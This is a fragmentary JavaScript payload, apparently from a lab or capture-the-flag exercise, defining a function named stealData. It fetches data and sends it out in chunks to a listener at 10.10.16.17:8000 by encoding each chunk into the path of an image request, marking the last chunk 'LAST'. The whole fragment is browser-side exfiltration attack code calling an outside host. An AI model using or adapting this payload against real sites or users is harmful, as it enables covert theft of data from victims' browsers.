...
function stealData()
{
	var uri = "http://10.10.16.17:8000/data";
	...
	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			...
			for (i = 0; i < numFullChunks; i++)
			{
				...
				downloadImage.src = "http://10.10.16.17:8000/exfil/" + i + "/" + exfilChunk + ".jpg";
			}
			...
			downloadImage.src = "http://10.10.16.17:8000/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
